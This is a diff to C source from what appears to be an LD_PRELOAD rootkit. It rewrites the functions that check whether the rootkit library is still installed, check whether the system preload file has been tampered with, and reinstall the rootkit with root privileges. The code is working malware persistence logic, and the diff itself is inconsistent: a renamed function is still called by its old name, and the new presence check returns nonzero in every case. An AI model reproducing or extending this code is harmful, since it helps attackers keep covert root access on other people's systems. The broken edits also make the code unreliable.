@@ -1,45 +1,45 @@
-int rknomore(void){ // returns 1 if rootkit mia
+int rknomore(void){
     DIR *dp;
     struct dirent *dir;
-    int status = -1;
-    size_t pathlen;
+    int status = 1;
 
     hook(COPENDIR, CREADDIR);
 
     dp = call(COPENDIR, INSTALL_DIR);
-    if(dp == NULL) return 1;
+    if(dp == NULL) return status;
 
     while((dir = call(CREADDIR, dp)) != NULL){
-        if(!strcmp(".\0", dir->d_name) || !strcmp("..\0", dir->d_name))
+        if(!strncmp(".", dir->d_name, 1))
             continue;
 
-        if(!strncmp(BDVLSO, dir->d_name, strlen(BDVLSO))){
-            status = 1;
+        if(strstr(dir->d_name, BDVLSO)){
+            status = -1;
+            break;
         }
     }
     closedir(dp);
 
+    return status;
+}
+
+int preload_inconsistent(void){ // returns 1 if something is wrong with the preload file.
+    struct stat preloadstat;
+    int status = 0,
+        statret;
+
+    hook(C__XSTAT);
+    memset(&preloadstat, 0, sizeof(stat));
+    statret = (long)call(C__XSTAT, _STAT_VER, LDSO_PRELOAD, &preloadstat);
+
+    if((statret < 0 && errno == ENOENT) || preloadstat.st_size != strlen(SOPATH))
+        status = 1;
 
     return status;
 }
 
-int ld_inconsistent(void){ // returns 1 if something is wrong with the preload file.
-    struct stat ldstat;
-    int inconsistent = 0, statval;
-
-    hook(C__XSTAT);
-    memset(&ldstat, 0, sizeof(stat));
-    statval = (long)call(C__XSTAT, _STAT_VER, LDSO_PRELOAD, &ldstat);
-
-    if((statval < 0 && errno == ENOENT) || ldstat.st_size != strlen(SOPATH))
-        inconsistent = 1;
-
-    return inconsistent;
-}
-
 void reinstall(void){
-    /* don't do anything if we don't need to... ((or can't)) */
-    if(rknomore() < 0) return;
+    if(geteuid() != 0) return;
+    if(rknomore()) return;
     if(!ld_inconsistent()) return;
 
     hook(CFOPEN, CFWRITE);
